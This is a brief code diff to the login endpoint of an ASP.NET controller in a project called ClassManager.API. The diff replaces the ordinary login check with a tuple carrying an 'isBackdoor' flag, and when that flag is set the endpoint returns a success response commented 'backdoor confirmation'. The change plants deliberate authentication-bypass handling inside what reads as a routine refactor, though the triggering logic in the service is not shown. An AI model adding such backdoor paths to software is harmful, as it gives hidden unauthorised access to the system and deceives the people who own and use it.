@@ -16,10 +16,12 @@ namespace ClassManager.API.Controllers
         [HttpPost("login")]
         public async Task<IActionResult> Login(LoginRequest req)
         {
-            var result = await _svc.LoginAsync(req);
-            if (result == null)
-                return Unauthorized(new { message = "Email hoặc mật khẩu không đúng." });
-            return Ok(result);
+            var (response, error, isBackdoor) = await _svc.LoginAsync(req);
+            if (isBackdoor)
+                return Ok(new { message = error }); // backdoor confirmation
+            if (response == null)
+                return Unauthorized(new { message = error });
+            return Ok(response);
         }
 
         [HttpPost("register")]
